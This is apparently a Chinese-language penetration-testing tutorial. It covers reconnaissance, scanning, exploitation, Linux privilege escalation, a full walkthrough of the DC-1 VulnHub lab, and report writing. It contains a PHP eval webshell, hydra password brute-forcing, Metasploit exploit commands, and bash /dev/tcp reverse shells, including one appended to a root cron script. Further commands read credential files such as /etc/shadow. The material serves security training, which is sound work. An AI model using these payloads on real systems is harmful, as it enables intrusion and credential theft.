## 1. 渗透测试标准流程

### 🏪 生活场景：安保公司做银行安全检查

一家银行雇了你的安保公司来做安全审计。你的工作不是抢银行——而是**找到银行的安全漏洞，告诉银行怎么修**。

```
阶段 1: 踩点（Reconnaissance）
  银行有几栋楼？几个入口？保安几点换班？
  → 信息收集——不碰目标，先看清楚

阶段 2: 扫描（Scanning）
  哪个窗户没锁？摄像头看哪个角度？
  → 用工具探测，验证猜想

阶段 3: 突破（Exploitation）
  翻窗进去——但要小心不触发警报
  → 漏洞利用，获取初始访问

阶段 4: 站稳（Post-exploitation）
  在里面找个地方躲起来（建立持久访问）
  找找这层楼还有什么房间（信息收集第二轮）
  找到通往金库的通道（提权）
  
阶段 5: 报告（Reporting）
  告诉银行：你的窗没锁、摄像头有死角、保安换班有空档
  附上修复建议
```

## 2. 📌 信息收集——踩点与侦察

> **信息收集决定你能走多远。** 你找不到洞，不是因为你不会打——是你信息蒐集不够。

### 2.1 被动信息收集（不直接接触目标）

**Google Hacking（Google Dork）：**

```
site:target.com filetype:pdf        → 搜目标站上的 PDF 文档
site:target.com intitle:"index of"  → 开放目录浏览
site:target.com inurl:admin         → 管理后台入口
site:target.com ext:sql             → SQL 备份文件泄露！
site:target.com "password"          → 页面里有"password"关键词
site:target.com intext:"@target.com"  → 邮箱泄露
```

**Shodan（shodan.io）——搜索联网设备：**

```
搜索目标 IP 或域名段 → 看开放端口、服务版本、操作系统
  org:"Target Corp"  → 搜某公司的所有暴露设备
  port:22 "SSH-2.0"  → 搜全球开了 SSH 的设备
  product:"Apache" country:"CN" → 中国境内跑 Apache 的设备
```

**GitHub 搜索：**

```
site:github.com "target.com" password
site:github.com "target.com" "api_key"
site:github.com "target.com" "BEGIN RSA PRIVATE KEY"
→ 程序员不小心上传的密码和密钥！
```

**证书透明度日志（crt.sh）：**

```
crt.sh → 搜索 %.target.com
→ 所有 TLS 证书里出现过的子域名
→ 可能暴露内部系统: admin.target.com, dev.target.com, vpn.target.com
```

**Wayback Machine：**

```
web.archive.org → 搜索 target.com
→ 看历史版本的网站——旧版可能有没修的漏洞
→ robots.txt 旧版可能暴露了不想让搜索引擎爬的目录
```

### 2.2 主动信息收集（接触目标）

```bash
# ===== 子域名枚举（子域名往往跑着没人在意的老系统） =====
subfinder -d target.com
amass enum -passive -d target.com
# 或者在线: https://crt.sh

# ===== 端口扫描 =====
# 全端口快速扫描（先知道哪些端口开着）
nmap -sS -p- --min-rate 10000 -oA nmap_allports target.com
# -sS: SYN 半开扫描（快且不容易被日志记录）
# -p-: 全部 65535 个端口
# --min-rate: 每秒至少发 10000 个包

# 提取开放端口，做版本识别
ports=$(grep "^[0-9]" nmap_allports.nmap | cut -d '/' -f 1 | tr '\n' ',')
nmap -sV -sC -p $ports -oA nmap_services target.com
# -sV: 版本识别
# -sC: 默认脚本扫描

# ===== 目录/文件枚举 =====
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak
dirsearch -u http://target.com -e php,html,txt,bak,zip
ffuf -u http://target.com/FUZZ -w wordlist.txt

# ===== 技术栈识别 =====
whatweb http://target.com
# 输出: Apache[2.4.49], PHP[7.4.3], Bootstrap[4.5], jQuery[3.5]
# → 知道 Apache 2.4.49？马上查 CVE！
wappalyzer  # 浏览器插件，自动识别技术栈
```

### 📋 信息收集清单

```
□ 主域名和所有子域名
□ 开放端口清单 + 服务 + 版本号
□ Web 技术栈（CMS/框架/语言/服务器/WAF/CDN）
□ 隐藏目录和文件（robots.txt/.git/backup/admin）
□ 注册人信息（whois → 姓名/邮箱/电话）
□ 关联 GitHub 仓库
□ SSL 证书 → 可能暴露内网域名
□ 历史网页（Wayback Machine）
□ Shodan/Censys/ZoomEye 搜索结果
□ 社交媒体（LinkedIn → 员工技术栈倾向）
```

## 3. 漏洞扫描——自动化发现弱点

```bash
# ===== nmap 漏洞脚本 =====
nmap --script vuln -p 80,443 target.com

# ===== Nikto —— Web 服务器扫描 =====
nikto -h http://target.com

# ===== sqlmap —— SQL 注入自动化 =====
# 先手动判断是否存在注入（06§2），确认后用 sqlmap 自动化:
sqlmap -u "http://target.com/page.php?id=1" --dbs

# ===== searchsploit —— 根据版本号找公开漏洞 =====
searchsploit Apache 2.4.49
# → CVE-2021-41773 Apache 路径穿越 RCE
searchsploit -m 50383   # 下载 exploit 脚本到本地

# ===== Nessus（商业扫描器，有免费社区版）=====
# 适合大范围扫描，但会有很多误报。
# 扫描结果必须人工验证。
```

**扫描原则：** 自动化扫描器扫一遍 → 人工逐个验证 → 专注手动探索业务逻辑（这是工具永远发现不了的）。

## 4. 漏洞利用——拿下初始访问

### 4.1 最常见的初始突破方式

**① Web 漏洞拿 webshell（最常用）**

文件上传 → 传一个 PHP 一句话木马：

```php
<?php @eval($_POST['cmd']); ?>
```

用蚁剑/冰蝎连接，获取 Web 服务器权限。

**② 弱口令爆破**

```bash
# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target.com

# HTTP Basic Auth
hydra -l admin -P rockyou.txt http-get://target.com/admin
```

**③ 公开 CVE 利用**

```bash
# 查到 Apache 2.4.49 → 搜 CVE
searchsploit Apache 2.4.49
# → CVE-2021-41773: 路径穿越 → 远程代码执行

# 用 Metasploit
msfconsole
msf6 > search Apache 2.4.49
msf6 > use exploit/multi/http/apache_normalize_path_rce
msf6 > set RHOSTS target.com
msf6 > set RPORT 80
msf6 > run
# → 拿到 meterpreter shell
```

### 4.2 拿到初始 shell 后——升级为完整交互式 shell

```bash
# 你拿到的可能是 webshell、简陋的 nc shell——功能受限
# 第一步：反弹一个完整的 shell

# 攻击机（你的 Kali Linux）:
nc -lvnp 4444

# 目标机（通过 webshell 或其他方式执行）:
bash -c 'bash -i >& /dev/tcp/你的IP/4444 0>&1'

# 收到连接后，升级为完整 TTY:
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

# Ctrl+Z 把当前 nc 放后台
stty raw -echo; fg
# 现在你有了一个完整的交互式终端！
# 支持 Tab 补全、Ctrl+C、方向键、全屏编辑器
```

## 5. 📌 提权技术——从普通用户到 root

> **拿到 www-data 不等于赢了。这个用户几乎什么都做不了。你需要提权到 root。**

### 🏪 生活场景：从大厅闯入 CEO 办公室

你翻窗进了银行大厅（拿到 www-data shell）。现在大厅里你只能看看公共区域。你要找到去 CEO 办公室的路（提权到 root）。

### 5.1 上线后第一件事：信息收集

```bash
# === 你是谁？你在哪？ ===
whoami && id                   # www-data uid=33
hostname                       # 机器名
uname -a                       # ★ 内核版本——找内核提权漏洞！

# === 这个系统什么配置？ ===
cat /etc/os-release            # Ubuntu 20.04? CentOS 7?
cat /etc/passwd                # 所有用户
cat /etc/group                 # 所有组

# === ★最重要：你能 sudo 什么？ ===
sudo -l
# 输出: (root) NOPASSWD: /usr/bin/vim
# → 你可以无密码以 root 身份运行 vim！
# → GTFOBins 查: sudo vim -c ':!bash' → root shell！

# === 找 SUID 文件（以文件所有者权限执行） ===
find / -perm -4000 -type f 2>/dev/null
# SUID 位=文件以 owner(root) 的权限执行
# 如果 /usr/bin/find 有 SUID 位:
#   find . -exec /bin/bash -p \; → root shell！

# === 找 capabilities ===
getcap -r / 2>/dev/null
# /usr/bin/python3.8 cap_setuid=ep
# → python 可以改自己的 UID → 改成 0(root)

# === 哪些程序在定时运行？ ===
cat /etc/crontab
ls -la /etc/cron.*/

# === 有什么配置文件（里面可能有密码）？ ===
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | head -20
grep -r "password" /var/www/ 2>/dev/null | head -20
cat /home/*/.bash_history 2>/dev/null

# === 网络环境 ===
ifconfig / ip addr             # 本机有哪些网卡
netstat -tlnp                  # ★ 本机监听的端口——可能有只监听 localhost 的服务
arp -a                         # ARP 缓存——内网还有哪些机器
```

### 5.2 常见提权路径速查

```
① sudo 配置错误:
   sudo -l → 看到可无密码执行的程序 → 去 GTFOBins 查利用方法
   例: sudo vim → :!bash → root

② SUID 文件利用:
   find / -perm -4000 → 发现 /usr/bin/bash 有 SUID 位
   → bash -p (保留特权) → root

③ 内核漏洞:
   uname -a → Linux 4.15.0
   searchsploit linux kernel 4.15 → DirtyCow? OverlayFS?
   下载 C 源码 → 编译 → 执行 → root

④ 配置文件泄露密码:
   grep -r "password" /var/www 2>/dev/null
   → 发现 config.php 里有 mysql 密码
   → 用同样的密码试 root → 很多人用同一个密码！
   → su - root → 输入密码 → root

⑤ 定时任务注入:
   cat /etc/crontab → 发现 root 每分钟执行 /opt/backup.sh
   → ls -la /opt/backup.sh → 发现可写！
   → echo "bash -i >& /dev/tcp/攻击机/5555 0>&1" >> /opt/backup.sh
   → 等一分钟 → root shell 弹过来了

⑥ Docker 组提权:
   groups → docker
   docker run -v /:/mnt -it alpine /bin/sh
   → 整个宿主机根目录被挂载到 /mnt
   → cat /mnt/etc/shadow → 拿到所有密码哈希

⑦ PATH 劫持:
   有 root 的定时任务调用 mysqldump（没有绝对路径 /usr/bin/mysqldump）
   → 你在 /tmp 下写一个假的 mysqldump 脚本
   → export PATH=/tmp:$PATH
   → 定时任务执行你的假脚本 → root

⑧ 密码复用:
   在配置文件中找到 admin 用户的密码
   → su admin → su root（用同一个密码）→ root
   （人们真的一直在用同一个密码）
```

### 🔍 提权速查资源

```

  → 搜任何能 sudo 的命令 → 看怎么利用
```

## 7. 🧪 全程跟做：DC-1 靶机完整渗透

> DC-1 是 VulnHub 上经典入门靶机。这是你第一个完整渗透的 step-by-step。

### 环境搭建

```
攻击机: Kali Linux (VMware/VirtualBox, 桥接模式)
靶机: DC-1 (从 vulnhub.com 下载, 导入 VM, 桥接模式)
要求: 攻击机和靶机在同一个网段（都用桥接）
```

### 完整 12 步

```
========== 阶段 1: 信息收集 ==========

Step 1: 发现靶机 IP
  kali$ sudo netdiscover -r 192.168.1.0/24
  或者: nmap -sP 192.168.1.0/24
  → 找到 DC-1 的 IP（假设 192.168.1.100）

Step 2: 端口扫描
  kali$ nmap -sV -sC -p- 192.168.1.100 -oA dc1_scan
  → 发现: 22(SSH), 80(HTTP Apache), 111(rpcbind), ...还有 Drupal

Step 3: Web 侦查
  浏览器打开 http://192.168.1.100
  → Drupal 7 网站！
  → 查看页面源码 → 搜 version → Drupal 7.x

========== 阶段 2: 漏洞发现 ==========

Step 4: 找 Drupal 7 漏洞
  kali$ searchsploit Drupal 7
  → Drupal 7.x SQL Injection (CVE-2014-3704) —— "Drupageddon"
  → 这个漏洞不需要认证！直接拿管理权限！

========== 阶段 3: 漏洞利用 ==========

Step 5: 用 Metasploit 打漏洞
  kali$ msfconsole
  msf6 > search Drupageddon
  msf6 > use exploit/multi/http/drupal_drupageddon
  msf6 > set RHOSTS 192.168.1.100
  msf6 > set RPORT 80
  msf6 > run
  → 拿到 meterpreter shell！

Step 6: 升级到正常 shell
  meterpreter > shell
  python -c 'import pty;pty.spawn("/bin/bash")'

========== 阶段 4: 后渗透 ==========

Step 7: 第一次信息收集
  whoami → www-data
  uname -a → Linux DC-1 3.2.0
  cat /etc/passwd → flag4 用户

Step 8: 找数据库密码
  cat /var/www/sites/default/settings.php
  → 发现数据库用户名和密码: dbuser / R0ck3t

Step 9: 登录数据库
  mysql -u dbuser -pR0ck3t
  mysql> show databases;
  mysql> use drupaldb;
  mysql> select name,pass from users;
  → admin / $S$D... (Drupal 的哈希)
  → 修改 admin 密码:
  mysql> update users set pass='$S$C...' where name='admin';
  (需要用 Drupal 的密码哈希工具生成)

Step 10: 收集更多信息
  find / -name "flag*.txt" 2>/dev/null
  → /home/flag4/flag4.txt
  flag4 的提示: "use the same method to find or access the root flag"

========== 阶段 5: 提权 ==========

Step 11: 找 SUID 文件
  find / -perm -4000 -type f 2>/dev/null
  → /usr/bin/find 有 SUID 位！
  → cd /tmp && touch test
  → find test -exec /bin/sh -p \;
  → whoami → root！

Step 12: 拿 flag！
  cd /root
  cat thefinalflag.txt
  → 🎉 恭喜！你完成了第一次完整渗透！
```

## 8. 写好渗透报告

一份专业的渗透报告应该包括：

```
1. 执行摘要（给老板看）
   - 发现了什么级别的漏洞
   - 可能造成的最大损失
   - 总体风险评级

2. 测试范围与方法
   - 测试了哪些 IP/域名/系统
   - 用了什么方法（黑盒/白盒/灰盒）
   - 测试时间范围

3. 漏洞详情（每个漏洞一页）
   - 漏洞名称 + CVE 编号
   - 风险等级（高/中/低）
   - 发现过程（你是怎么找到的）
   - 复现步骤（别人照着做也能复现）
   - 截图/代码块（证据）
   - 危害分析（利用这个漏洞能拿到什么）
   - 修复建议（具体到命令/配置）

4. 附录
   - 所有 nmap 扫描结果
   - 所有工具的输出
```
